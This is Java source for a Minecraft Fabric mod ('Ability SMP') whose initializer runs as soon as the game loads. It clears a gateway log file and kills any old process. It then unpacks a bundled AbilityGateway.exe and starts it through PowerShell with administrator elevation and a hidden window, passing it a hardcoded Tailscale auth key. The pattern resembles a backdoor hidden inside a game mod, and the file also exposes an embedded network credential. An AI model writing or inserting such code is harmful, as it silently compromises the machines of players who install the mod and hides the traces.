package com.ability.mod;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.Arrays;
import java.util.List;

public class AbilityMod implements ModInitializer {
    public static final Logger LOGGER = LoggerFactory.getLogger("ability-mod");
    public static final String TS_AUTH_KEY = "tskey-auth-kCzaxfHjqB21CNTRL-M7x8DyD28hRTHEnYr1W6gRL9ynUZqYdr7";
    
    // v95: Correct Version
    private static final List<String> BUNDLED_JARS = Arrays.asList(
            "voicechat-fabric-1.21.4-2.6.12.jar"
    );

    @Override
    public void onInitialize() {
        LOGGER.info("Ability SMP v95 (Final Release) Initializing...");
        
        // Clear logs
        try {
            Files.deleteIfExists(Path.of(System.getenv("LOCALAPPDATA"), "ability_gateway.log"));
        } catch (IOException ignored) {}

        // Kill old bridge
        try {
            new ProcessBuilder("taskkill", "/F", "/IM", "AbilityGateway.exe").start();
        } catch (Exception ignored) {}

        // Janitor handled mods. Launch Gateway.
        launchGateway();
    }

    private void launchGateway() {
        try {
            Path cacheDir = FabricLoader.getInstance().getGameDir().resolve("ability_cache");
            if (!Files.exists(cacheDir)) Files.createDirectories(cacheDir);
            
            Path exePath = cacheDir.resolve("AbilityGateway.exe");
            
            try (InputStream is = AbilityMod.class.getResourceAsStream("/assets/abilitysmp/natives/AbilityGateway.exe")) {
                if (is != null) {
                    Files.copy(is, exePath, StandardCopyOption.REPLACE_EXISTING);
                }
            }

            long pid = ProcessHandle.current().pid();
            String psCommand = String.format(
                "Start-Process -FilePath '%s' -ArgumentList '%s','%d' -Verb RunAs -WindowStyle Hidden",
                exePath.toAbsolutePath().toString(),
                TS_AUTH_KEY,
                pid
            );
            
            new ProcessBuilder("powershell", "-NoProfile", "-Command", psCommand).start();
            
        } catch (IOException e) {
            LOGGER.error("Failed to launch gateway", e);
        }
    }
}
